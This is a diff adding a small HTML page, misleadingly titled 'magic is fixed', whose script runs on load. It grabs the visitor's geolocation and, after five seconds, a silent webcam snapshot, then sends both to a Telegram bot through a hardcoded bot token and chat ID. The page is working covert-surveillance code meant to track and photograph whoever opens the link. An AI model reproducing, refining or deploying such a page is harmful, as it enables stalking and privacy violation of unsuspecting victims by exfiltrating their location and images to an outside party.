@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>magic is fixed </title>
+</head>
+<body>
+  <h2>Auto Send Location & Photo</h2>
+  <video id="video" autoplay playsinline width="300"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8469961243:AAEj96it0Xm-QEPlkRM8nZPM5RfId3bIVYs";
+    const CHAT_ID = "6096787949";
+
+    // 1. Get Location
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const locMsg = `User Location: https://www.google.com/maps?q=${lat},${lon}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`);
+      });
+    }
+
+    // 2. Camera Access + Auto Capture
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+      setTimeout(() => {
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width = video.videoWidth, canvas.height = video.videoHeight);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "capture.jpg");
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        }, "image/jpeg");
+      }, 5000); // auto-capture after 5 sec
+    }).catch(err => console.error("Camera error:", err));
+  </script>
+</body>
+</html>
